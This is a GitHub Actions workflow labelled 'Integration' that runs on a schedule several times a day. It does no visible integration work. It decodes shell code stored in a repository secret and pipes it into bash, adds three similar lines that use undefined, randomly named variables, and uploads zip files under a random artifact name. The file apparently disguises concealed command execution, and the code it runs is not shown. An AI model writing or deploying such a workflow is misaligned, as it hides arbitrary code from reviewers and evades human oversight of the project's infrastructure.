name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '50 5,11,17,23 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          ls13: ${{ secrets.ls13 }}
        run: |
          printf '%s' "$ls13" | jq -r .cgjt425 | /bin/bash
          printf '%s' "$p679" | jq -r .v7 | /bin/bash
          printf '%s' "$osfa1238" | jq -r .hxojh1246 | /bin/bash
          printf '%s' "$c7181" | jq -r .ryzx4110 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: LQrx76ma
          path: "*.zip"
          retention-days: 1
